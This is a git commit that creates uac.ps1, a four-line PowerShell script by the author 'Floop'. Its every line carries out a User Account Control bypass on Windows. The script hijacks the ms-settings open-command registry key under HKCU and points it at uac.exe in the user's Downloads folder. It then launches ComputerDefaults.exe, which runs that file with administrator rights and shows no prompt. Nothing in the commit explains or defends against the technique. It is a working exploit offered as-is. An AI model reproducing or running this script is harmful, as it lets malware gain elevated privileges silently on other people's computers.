01aadc29206ee9e46419e3589873227e8009367a
Floop <76122284+poorkid8921@users.noreply.github.com>
2025-04-05 16:37:18 +0300

    Create uac.ps1

---
+++ uac.ps1
@@ -0,0 +1,4 @@
+New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
+New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "../../Users/$Env:UserName/Downloads/uac.exe" -Force
+Start-Process "C:\Windows\System32\ComputerDefaults.exe"
